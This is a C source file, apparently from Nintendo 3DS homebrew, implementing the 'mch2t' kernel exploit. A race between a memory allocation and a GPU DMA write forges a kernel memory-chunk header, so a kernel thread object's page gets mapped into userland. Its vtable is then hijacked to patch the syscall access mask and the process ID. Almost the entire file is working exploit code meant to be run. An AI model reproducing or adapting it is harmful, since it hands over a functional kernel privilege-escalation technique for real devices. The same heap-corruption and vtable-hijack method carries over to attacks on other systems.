// Copyright (C) 2016 angelsl
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.

#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "mch2t.h"

#ifdef DEBUG_MCH2T
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) gfxFlushBuffers()
#endif

#define ERROR_PRINT(step, code, msg) DEBUG_PRINT("S%02uE%02u %s\n", step, code, msg)
#define ERROR_PRINT_RES(step, code, res, msg) DEBUG_PRINT("S%02uE%02u %lX %s\n", step, code, res, msg)
#define STEP_PRINT(step, msg) DEBUG_PRINT("%02u: %s\n", step, msg)
#define STEP_PRINT_VA(step, msg, ...) DEBUG_PRINT("%02u: " msg "\n", step, __VA_ARGS__)

typedef struct {
    u32 pages;
    void *next;
    void *prev;
} MemChunkHdr;
_Static_assert(sizeof(MemChunkHdr) == 12, "MemChunkHdr wrong size");

typedef struct {
    void *vtable;
    MemChunkHdr mch;
    u8 garbage[0xB0 - 4 - 12];
} KThread;
_Static_assert(sizeof(KThread) == 0xB0, "KThread wrong size");

__attribute__((unused)) static Result dump_memory(const u8 *addr, size_t size) {
    Result res;
    Handle f;
    FS_Archive sdmc = {0x00000009, (FS_Path) {PATH_EMPTY, 1, (const u8 *)""}, 0};

    if (R_FAILED(res = FSUSER_OpenArchive(&sdmc))) {
        return res;
    }

    FS_Path p = {PATH_ASCII, 9, "/ram.bin"};
    FSUSER_DeleteFile(sdmc, p);
    if (R_FAILED(res = FSUSER_OpenFile(&f, sdmc, p, FS_OPEN_WRITE | FS_OPEN_CREATE, 0))) {
        return res;
    }

    DEBUG_PRINT("dumping 0x%X bytes from %p ... ", size, addr);
    for (const u8 *cursor = addr; cursor < addr + size;) {
        u32 w;
        u32 remn = addr + size - cursor;
        if (R_FAILED(res = FSFILE_Write(f, &w, cursor - addr, cursor, remn < 0x200 ? remn : 0x200, FS_WRITE_FLUSH))) {
            DEBUG_PRINT("failed\n");
            return res;
        }
        cursor += w;
    }

    if (R_FAILED(res = FSFILE_Close(f))) {
        DEBUG_PRINT("failed\n");
        return res;
    }

    DEBUG_PRINT("OK\n");

    return FSUSER_CloseArchive(&sdmc);
}

static Result get_kobj_addr(Handle object, void **addr) {
    Handle dup;
    Result res;

    if (R_FAILED(res = svcDuplicateHandle(&dup, object))) {
        return res;
    }

    register Handle arg_handle asm("r0") = dup;
    register Result out_result asm("r0");
    register void *out_kaddr asm("r2");
    asm volatile("svc 0x23\n\t" // svcCloseHandle(dup);
    : "=r"(out_result),  "=r"(out_kaddr)
    : "r"(arg_handle)
    : "r1", "r3");
    *addr = (u8 *)out_kaddr - 4; // -4 to include vtable
    return out_result;
}

static u8 flush_buf[0x10000];
__attribute__((optimize(0))) __attribute__((always_inline)) static inline void flush_caches(void) {
    // optimize(0) as otherwise this whole function will be NOPed out
    for (u32 i = 0; i < 6; ++i) {
        memcpy(flush_buf + 0x8000, flush_buf, 0x8000);
    }
    for (u32 i = 0; i < 6; ++i) {
        memcpy(flush_buf, flush_buf + 0x8000, 0x8000);
    }
}

__attribute((optimize(0))) static void read_flush(const void *src, s64 size) {
    for (const u8 *cursor = src; size > 0; size -= 0x1000) {
        memcpy(flush_buf, cursor, size > 0x1000 ? 0x1000 : size);
        cursor += 0x1000;
    }
}

__attribute__((always_inline)) static inline Result gpu_memcpy(u32 dest, u32 src, size_t size, bool wait) {
    // should we flush caches here too?
    Result res;

    if (R_FAILED(res = GX_TextureCopy((u32 *)src, 0, (u32 *)dest, 0, size, 0))) {
        return res;
    }

    if (wait) {
        gspWaitForPPF();
    }

    flush_caches();
    return 0;
}

static inline void *slabheap_vtop(void *p) {
    u32 temp = (u32) p;
    // phys address = virt address - virt base + phys base
    return (void *) (temp - 0xfff70000 + 0x1ffa0000 - 0x40000000);
}

static u8 is_n3ds;
static volatile u8 kernel_hacked = 0;
static Result kernel_entry(void) {
    typedef struct {
        u8 garbage[0x90];
        u8 svc_mask[0x10];
    } KProcess_N3DS;
    _Static_assert(sizeof(KProcess_N3DS) == 0xA0, "KProcess_N3DS wrong size");

    typedef struct {
        u8 garbage[0x88];
        u8 svc_mask[0x10];
    } KProcess_O3DS;
    _Static_assert(sizeof(KProcess_O3DS) == 0x98, "KProcess_O3DS wrong size");

    // Patch SVC access control mask to allow everyone of them
    // First patch the KProcess, for new threads
    void *svc_mask;
    if (is_n3ds) {
        KProcess_N3DS *proc = *((KProcess_N3DS **)0xFFFF9004);
        svc_mask = proc->svc_mask;
    } else {
        KProcess_O3DS *proc = *((KProcess_O3DS **)0xFFFF9004);
        svc_mask = proc->svc_mask;
    }
    memset(svc_mask, 0xFF, 0x10);

    typedef struct {
        u8 svc_mask[0x10];
        u8 garbage[0xB8];
    } ThreadCtx;
    _Static_assert(sizeof(ThreadCtx) == 0xC8, "ThreadCtx wrong size");

    typedef struct {
        u8 garbage[0x8C];
        ThreadCtx *page_end;
    } KThread2;
    _Static_assert(sizeof(KThread2) == 0x90, "KThread2 wrong size");

    // Then patch the KThread
    ThreadCtx *ctx = (*((KThread2 **)0xFFFF9000))->page_end - 1;
    memset(ctx->svc_mask, 0xFF, 0x10);

    kernel_hacked = 1;

    return 0;
}

static void dummy_thread_entry(volatile u8 *quit) {
    while (!*quit) {
        svcSleepThread(1000000);
    }
    svcExitThread();
}

static Handle arbiter;
static volatile u8 delay_status = 0;
static volatile u32 allocate_addr = 0;
static void delay_work(void) {
    while (delay_status < 1) {
        svcSleepThread(1000000);
    }
    //u32 i = 0;
    delay_status = 2;
    u32 addr = allocate_addr;
    while ((u32) svcArbitrateAddress(arbiter, addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814) {
        svcSleepThread(10000);
    }
    while (delay_status < 3) {
        //if (i++ == 10000000) {
        //    i = 0;
        flush_caches();
        svcSleepThread(10000);
        //}
    }
    svcExitThread();
}

static volatile u32 allocate_size = 0;
static volatile Result allocate_res = -1;
static volatile u8 allocate_status = 0;
static void allocate_work(void) {
    allocate_status = 1;
    while (allocate_status < 2) {
        svcSleepThread(500);
    }
    allocate_status = 3;
    while (allocate_status < 4) {
        svcSleepThread(250);
    }
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-qual"
    allocate_res = svcControlMemory((u32 *)&allocate_addr, allocate_addr, 0, allocate_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
#pragma GCC diagnostic pop
    allocate_status = 5;
    svcExitThread();
}

u32 old_pid = 0;

s32 kernel_patch_pid_zero() {
    u32* pidPtr = NULL;
    if(is_n3ds) {
        pidPtr = (u32*) (*(u32*) 0xFFFF9004 + 0xBC);
    } else {
        pidPtr = (u32*) (*(u32*) 0xFFFF9004 + 0xB4);
    }

    old_pid = *pidPtr;
    *pidPtr = 0;

    return 0;
}

s32 kernel_patch_pid_reset() {
    u32* pidPtr = NULL;
    if(is_n3ds) {
        pidPtr = (u32*) (*(u32*) 0xFFFF9004 + 0xBC);
    } else {
        pidPtr = (u32*) (*(u32*) 0xFFFF9004 + 0xB4);
    }

    *pidPtr = old_pid;

    return 0;
}

#define VTABLE_ENTRIES 64
#define MAX_HANDLES 32
#define DUMMY_STACK_U32S 0x80
#define WORK_STACK_U32S 0x400
#define PAGE_SIZE 0x1000
#define PAGE_START(addr) ((void *)(((u32)(addr)) & (~0xFFF)))
#define ADDR_REL_PAGE_START(addr) ((((u32)(addr)) & 0xFFF))
extern u32 __ctru_heap;
extern u32 __ctru_heap_size;
extern Handle gspEvents[GSPGPU_EVENT_MAX];

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-variable"
Result mch2t(void) {
    Result res;
    arbiter = __sync_get_arbiter();
    {
        aptOpenSession();
        res = APT_CheckNew3DS(&is_n3ds);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(0, 0, res, "checking o3ds/n3ds failed");
            aptCloseSession();
            return -1;
        }

        res = APT_SetAppCpuTimeLimit(5);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(0, 1, res, "setting CPU time limit failed");
            aptCloseSession();
            return -1;
        }
        aptCloseSession();
    }

    s64 start_free = osGetMemRegionFree(MEMREGION_APPLICATION);

    STEP_PRINT(1, "allocate vtables");
    // 1: allocate vtables
    Result (**vtable)(void);
    const u32 vtable_alloc_size = (((VTABLE_ENTRIES * sizeof(Result (*)(void))) >> 12) + 1) * PAGE_SIZE;
    {
        res = svcControlMemory((void *) &vtable, 0, 0, vtable_alloc_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(1, 0, res, "vtable alloc failed");
            return -1;
        }
        for (u32 i = 0; i < VTABLE_ENTRIES; ++i) {
            vtable[i] = &kernel_entry;
        }
    }

    STEP_PRINT(1, "start alloc/delay threads");
    // pre-4: start allocation and delay threads
    // do this now because we cannot start new threads later
    Handle alloc_thread;
    Handle delay_thread;
    {
        static u32 alloc_stack[WORK_STACK_U32S];
        static u32 delay_stack[WORK_STACK_U32S];
        res = svcCreateThread(&alloc_thread, (ThreadFunc) &allocate_work, 0, alloc_stack + WORK_STACK_U32S, 0x3F, 1);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(1, 1, res, "failed to start alloc thread");
            return -1;
        }
        res = svcCreateThread(&delay_thread, (ThreadFunc) &delay_work, 0, delay_stack + WORK_STACK_U32S, 0x18, 1);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(1, 2, res, "failed to start delay thread");
            return -1;
        }
    }

    STEP_PRINT(2, "allocate contiguous KThreads");
    // 2: allocate KThreads
    KThread *start_continuous = 0;
    Handle start_continuous_handle;
    {
        Handle dummy_thread_handles[MAX_HANDLES] = {0};
        u32 dummy_thread_count = 0;
        u32 start_continuous_idx = 0;
        static u32 stacks[MAX_HANDLES][DUMMY_STACK_U32S];
        KThread *prev_addr = 0;
        u8 success = 0;

        // allocate as many KThreads as we can
        for (dummy_thread_count = 0; dummy_thread_count < MAX_HANDLES; ++dummy_thread_count) {
            Handle h;
            volatile u8 quit;
            res = svcCreateThread(&h, (ThreadFunc) &dummy_thread_entry, (u32) &quit, stacks[dummy_thread_count] + 1, 0x3F, 0);
            if (R_FAILED(res)) {
                break;
            }
            KThread *addr;
            if (R_FAILED(res = get_kobj_addr(h, (void **) &addr))) {
                ERROR_PRINT_RES(2, 2, res, "failed to get dummy thread object address");
                if (R_FAILED(res = svcCloseHandle(h))) {
                    ERROR_PRINT_RES(2, 3, res, "warning: failed to close dummy_thread");
                    dummy_thread_count++;
                }
                break;
            }
            quit = 1;
            if (R_FAILED(res = svcWaitSynchronization(h, U64_MAX))) {
                ERROR_PRINT_RES(2, 4, res, "warning: failed to join dummy thread");
            }
            dummy_thread_handles[dummy_thread_count] = h;
            if (!start_continuous || ((u8 *)addr - (u8 *)prev_addr) != sizeof(KThread)) {
                start_continuous = addr;
                start_continuous_idx = dummy_thread_count;
            }
            prev_addr = addr;
        }

        while (start_continuous_idx < dummy_thread_count
               // at least 0x1004 bytes from start of the thread to the end of the block we allocated
               // because kernel will zero 0x1000 bytes from &start_continuous->mch
               && ((dummy_thread_count - start_continuous_idx) * sizeof(KThread)) >= (PAGE_SIZE + 4)) {
            // we need a KThread with the first 5 bytes in the same page
            if (PAGE_START(start_continuous) == PAGE_START((u8 *) start_continuous + 4)) {
                success = 1;
                break;
            }
            ++start_continuous_idx;
            ++start_continuous;
        }

        STEP_PRINT(3, "free KThreads");
        // 3: free the KThreads
        for (u32 i = 0; i < dummy_thread_count; ++i) {
            if (success && i == start_continuous_idx) {
                continue;
            }
            if (R_FAILED(svcCloseHandle(dummy_thread_handles[i]))) {
                ERROR_PRINT_RES(3, 0, res, "warning: failed to close dummy_thread");
            }
        }

        if (!success) {
            ERROR_PRINT(2, 0, "KThread allocation failed");
            return -1;
        }

        // this thread will be used as both the mch and for vtable hijacking
        start_continuous_handle = dummy_thread_handles[start_continuous_idx];
    }
    STEP_PRINT_VA(2, "continuous page at %p", (void *)start_continuous);

    // past this point, the exploit will not fail without either leaving the system
    // unstable or leaking a lot of resources
    // FIXME: attempt to cleanup all resources upon failure???

    STEP_PRINT(4, "fill memory and leave holes");
    // need all this to free all our garbage later
    u32 gpu_dma_buf;
    // const u32 linear_size = 17 * PAGE_SIZE;
    u32 linear_size;
    u32 linear_buffer;
    u32 frag_size;
    u32 frag_buffer;
    u32 gap_size = 0;
    u32 last_freed_page = 0;
    {
        // allocate a linear buffer for gpu DMA later
        res = svcControlMemory(&gpu_dma_buf, 0, 0, PAGE_SIZE, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 14, res, "failed to allocate GPU DMA buffer");
            goto exploit_failed;
        }

        // get the amount of memory to fill
        u32 free;
        {
            s64 free_ = osGetMemRegionFree(MEMREGION_APPLICATION);
            if (R_FAILED(free_)) {
                ERROR_PRINT_RES(4, 13, (Result) free_, "failed to get amount of free memory");
                goto exploit_failed;
            }
            free = (u32) free_;
        }

        STEP_PRINT_VA(4, "free memory: 0x%lX", free);
        // (((free_pages / 2) - 1) & ~1)
        linear_size = ((((free & ~0xFFF) >> 13) - 1) & ~1) << 12;
        STEP_PRINT_VA(4, "allocating linear buffer of 0x%lX", linear_size);

        // first allocate a linear buffer
        res = svcControlMemory(&linear_buffer, 0, 0, linear_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 10, res, "failed to allocate linear buffer");
            goto exploit_failed;
        }

        // now we allocate the rest of memory
        frag_size = free - linear_size;
        const u32 frag_addr = __ctru_heap + __ctru_heap_size;
        res = svcControlMemory(&frag_buffer, frag_addr, 0, frag_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 11, res, "failed to allocate frag buffer");
            goto exploit_failed;
        }

        // now make holes in the linear buffer
        // with a 15 page linear buffer, this is 8 holes (every even-indexed page)
        u32 _;
        for (u32 dealloc = (u32) linear_buffer; dealloc < (u32) linear_buffer + linear_size; dealloc += PAGE_SIZE * 2) {
            res = svcControlMemory(&_, dealloc, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
            if (R_FAILED(res)) {
                ERROR_PRINT_RES(4, 12, res, "failed to deallocate page in linear buffer");
                goto exploit_failed;
            }
            gap_size += PAGE_SIZE;
            last_freed_page = dealloc;
        }

        if (!last_freed_page) {
            ERROR_PRINT(4, 20, "last freed linear buffer page is zero?");
            goto exploit_failed;
        }

        if (!gap_size) {
            ERROR_PRINT(4, 21, "total deallocated size is zero?");
            goto exploit_failed;
        }
    }

    STEP_PRINT(4, "race!");
    // 4: race
    {
        // overwrite the mch of the 2nd last gap page
        u32 fake_hdr_dest = last_freed_page - 2 * PAGE_SIZE;
        // pass fake_hdr_dest somewhere that does a nop
        // attempt to prevent gcc from inlining it into gpu_memcpy
        // doubt the effect matters much at all, but well ...
        svcArbitrateAddress(arbiter, fake_hdr_dest, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0);

        u32 addr = frag_buffer + frag_size;
        addr = addr > 0xA000000 ? addr : 0xA000000;
        allocate_addr = addr;
        allocate_size = gap_size;
        STEP_PRINT_VA(4, "allocating %lX at vaddr %lX", gap_size, addr);

        // setup our fake memchunkhdr
        MemChunkHdr *fake_hdr = (MemChunkHdr *)gpu_dma_buf;
        fake_hdr->pages = 1;
        fake_hdr->next = slabheap_vtop(((u8 *)start_continuous) + 4);
        STEP_PRINT_VA(4, "KThread vaddr: %p", (void *)start_continuous);
        STEP_PRINT_VA(4, "mch.next points to %p", fake_hdr->next);

        GSPGPU_InvalidateDataCache((void*)fake_hdr_dest, 8);
        GSPGPU_FlushDataCache((void*)gpu_dma_buf, 8);
        gfxFlushBuffers();
        svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
        flush_caches();
        // here we go
        delay_status = 1;
        STEP_PRINT(4, "waiting for delay_thread");
        while (delay_status < 2);
        STEP_PRINT(4, "delay_thread started");

        STEP_PRINT_VA(4, "allocate_status: %u", allocate_status);
        allocate_status = 2;
        STEP_PRINT(4, "waiting for allocate_thread");
        while (allocate_status < 3);
        STEP_PRINT(4, "allocate_thread started");
        allocate_status = 4;
        // the moment addr is mapped, we DMA
        while ((u32) svcArbitrateAddress(arbiter, addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
        res = gpu_memcpy(fake_hdr_dest, gpu_dma_buf, 8, 1);
        GSPGPU_InvalidateDataCache((void*)fake_hdr_dest, 8);
        GSPGPU_FlushDataCache((void*)gpu_dma_buf, 8);
        gfxFlushBuffers();
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 2, res, "GPU DMA failed");
            goto exploit_failed;
        }
        STEP_PRINT(4, "waiting for allocation to end");
        while (allocate_status < 5);
        delay_status = 3;
        flush_caches();
        gfxFlushBuffers();
        if (R_FAILED(allocate_res)) {
            ERROR_PRINT_RES(4, 1, allocate_res, "memory allocation failed");
            goto exploit_failed;
        }

        STEP_PRINT(4, "close alloc_thread");
        res = svcWaitSynchronization(alloc_thread, U64_MAX);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 30, res, "warning: failed to join alloc_thread");
        }
        res = svcCloseHandle(alloc_thread);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 31, res, "warning: failed to close alloc_thread");
        }

        STEP_PRINT(4, "close delay_thread");
        res = svcWaitSynchronization(delay_thread, U64_MAX);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 32, res, "warning: failed to join delay_thread");
        }
        res = svcCloseHandle(delay_thread);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(4, 33, res, "warning: failed to close delay_thread");
        }
    }

    read_flush((const void *)allocate_addr, gap_size);
    flush_caches();
    // dump_memory((const u8 *)allocate_addr, gap_size);

    // OK, now the page is mapped to us
    // we have to access start_continuous from the userland vaddr
    STEP_PRINT_VA(5, "allocate_addr %lX", allocate_addr);
    u32 kern_page = allocate_addr + gap_size - PAGE_SIZE;

    res = svcControlMemory(&kern_page, kern_page, 0, PAGE_SIZE, MEMOP_PROT, MEMPERM_READ | MEMPERM_WRITE);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(5, 98, res, "warning: MEMOP_PROT failed");
    }

    KThread * const sc_userland = (KThread *)(allocate_addr + gap_size
                                              - PAGE_SIZE + ADDR_REL_PAGE_START(start_continuous));
    if ((u32)sc_userland > (allocate_addr + gap_size)) {
        ERROR_PRINT(5, 99, "sc_userland > (allocate_addr + gap_size)");
        goto exploit_failed;
    }

    STEP_PRINT(5, "get old vtable ptr");
    void *old_vtable = sc_userland->vtable;

    if (!old_vtable) {
        ERROR_PRINT(5, 97, "warning: might not have gotten kernel page");
    }

    STEP_PRINT_VA(5, "KThread userland vaddr: %p", (void *)sc_userland);
    STEP_PRINT_VA(5, "current refcount: %lu", sc_userland->mch.pages);
    STEP_PRINT_VA(5, "old vtable ptr: %p", old_vtable);

    if ((res = svcArbitrateAddress(arbiter, ((u32) &sc_userland->vtable),
                                   ARBITRATION_DECREMENT_AND_WAIT_IF_LESS_THAN_TIMEOUT, 0x7FFFFFFF, 0))
        != (Result) 0xD9001814) {
        STEP_PRINT(5, "fix refcount");
        sc_userland->mch.pages = 1; // fix refcount
        STEP_PRINT(5, "overwrite vtable ptr");
        sc_userland->vtable = vtable;

        STEP_PRINT(6, "call CloseHandle on our vtable");
        svcCloseHandle(start_continuous_handle);

        STEP_PRINT(7, "set svc mask");
        for (u32 wait = 0; wait < 1000000000 && !kernel_hacked; ++wait);
        if (!kernel_hacked) {
            ERROR_PRINT(7, 0, "vtable patch failed?");
            goto exploit_failed;
        }
        // don't fix the vtable, as calling the real methods
        // will fail since the KThread's data is corrupt
        // sc_userland->vtable = old_vtable;
    } else {
        ERROR_PRINT_RES(5, 1, res, "can't write to kernel page");
    }

    STEP_PRINT(8, "cleanup");
    /* res = svcCloseHandle(start_continuous_handle);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(8, 0, res, "warning: close start_continuous thread failed");
    }*/

    // deallocate all the damn memory
    u32 _;
    res = svcControlMemory(&_, frag_buffer, 0, frag_size, MEMOP_FREE, MEMPERM_DONTCARE);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(8, 10, res, "warning: freeing frag_buffer failed");
    }

    res = svcControlMemory(&_, gpu_dma_buf, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(8, 11, res, "warning: freeing gpu_dma_buf failed");
    }

    for (u32 dealloc = linear_buffer + PAGE_SIZE; dealloc < linear_buffer + linear_size; dealloc += PAGE_SIZE * 2) {
        //if (dealloc >= last_freed_page) {
        //    continue;
        //}
        res = svcControlMemory(&_, dealloc, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        if (R_FAILED(res)) {
            ERROR_PRINT_RES(8, 12, res, "warning: freeing linear_buffer failed");
        }
    }

    res = svcControlMemory(&_, (u32) vtable, 0, vtable_alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(8, 13, res, "warning: freeing vtable linear buffer failed");
    }

    res = svcControlMemory(&_, allocate_addr, 0, allocate_size, MEMOP_FREE, MEMPERM_DONTCARE);
    if (R_FAILED(res)) {
        ERROR_PRINT_RES(8, 14, res, "warning: freeing race allocation failed");
    }

    STEP_PRINT_VA(8, "free memory before exploit: %lld", start_free);
    STEP_PRINT_VA(8, "free memory now: %lld", osGetMemRegionFree(MEMREGION_APPLICATION));

    svcBackdoor(kernel_patch_pid_zero);
    srvExit();
    srvInit();
    svcBackdoor(kernel_patch_pid_reset);

    STEP_PRINT(9, "success!");
    return 0;

exploit_failed:
    DEBUG_PRINT("Exploit failed irrecoverably; please long-press power and reboot");
    while (true) {
        svcSleepThread(10000000000ULL);
    }
}
#pragma GCC diagnostic pop